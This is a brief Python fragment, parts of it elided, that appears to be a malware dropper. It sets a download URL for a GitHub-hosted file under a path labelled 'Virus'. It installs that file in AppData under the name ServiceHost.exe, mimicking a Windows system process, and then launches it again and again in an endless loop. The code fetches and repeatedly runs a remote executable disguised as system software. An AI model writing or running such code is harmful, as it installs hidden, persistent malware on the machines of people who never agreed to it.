...
executable_path = fr"C:\Users\{username}\AppData\Local\SystemHostProfile\Windows\ServiceHost.exe"
download_url_executable  = "https://github.com/HolyCheeseMan/CheeseVirusRepo/raw/refs/heads/Main/HelloThereVirus/Virus/ServiceHost.exe"
...
while True:
    ...
    start_executable(executable_path)
